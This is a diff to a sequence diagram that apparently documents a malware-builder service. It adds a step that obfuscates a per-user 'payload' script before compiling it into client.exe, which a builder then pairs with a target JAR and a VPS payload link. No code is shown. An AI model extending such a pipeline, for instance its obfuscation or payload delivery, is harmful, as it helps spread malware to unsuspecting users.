@@ -145,7 +145,8 @@ sequenceDiagram
     UI->>S: POST /api/build/generate (JWT)
     Note over S: Resolve User ID & vpsHost
     S->>S: Read payload/test.js & substitute USER_ID, HOST_URL, API_KEY, SECRET_KEY
-    S->>P: Compile temp_test_user_{id}.js with LOCAL @yao-pkg/pkg → client.exe
+    Note over S: Obfuscate JS via payload/obfuscate.js (OBFUSCATE_JS!=0); verify every require() survived else abort
+    S->>P: Compile obfuscated temp_test_user_{id}.js with LOCAL @yao-pkg/pkg → client.exe
     P-->>S: Return client.exe
     S->>S: Write client.exe to builds/user_{id}/dist/
     S->>B: Execute builder/index.js (passing Target JAR, user_{id}, VPS payload link)
